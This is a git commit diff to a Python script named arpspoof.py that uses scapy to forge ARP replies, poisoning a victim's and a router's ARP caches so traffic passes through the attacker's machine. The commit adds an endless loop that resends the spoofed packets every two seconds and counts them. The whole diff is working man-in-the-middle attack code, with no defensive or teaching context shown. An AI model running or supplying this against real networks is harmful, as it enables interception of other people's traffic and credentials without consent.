6b2982ed354625f978aeb8991eb9d0c4abe4f56d
gouthamk-cryptichub <k.goutham2000@gmail.com>
2020-08-22 04:47:06 -0400

    Added loop for consistence program implementation

--- arpspoof.py
+++ arpspoof.py
@@ -1,5 +1,7 @@
 #!/usr/bin/env python
 import scapy.all as scapy
+import time
+import sys
 
 def get_mac(ip):
     arp_req = scapy.ARP(pdst=ip)
@@ -7,12 +9,16 @@ def get_mac(ip):
     arp_broad_req = broadcast/arp_req
     live = scapy.srp(arp_broad_req, timeout=1, verbose=False)[0]
     return live[0][1].hwsrc
-def arpsend(target_ip, target_addr, src_ip):
+def arpsend(target_ip, src_ip):
+    target_addr = get_mac(target_ip)
     arp_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_addr, psrc=src_ip)
-    scapy.send(arp_packet)
+    scapy.send(arp_packet, verbose=False)
 
-
-victim_addr = get_mac(victim_ip)
-router_addr = get_mac(router_ip)
-arpsend(victim_ip, victim_addr, router_ip)
-arpsend(router_ip, router_addr, victim_ip)
+packet_count = 0
+while True:
+    arpsend(victim_ip, router_ip)
+    arpsend(router_ip, victim_ip)
+    packet_count += 2
+    print("\rSpoofing...sent " + str(packet_count) + " packets"),
+    sys.stdout.flush()
+    time.sleep(2)
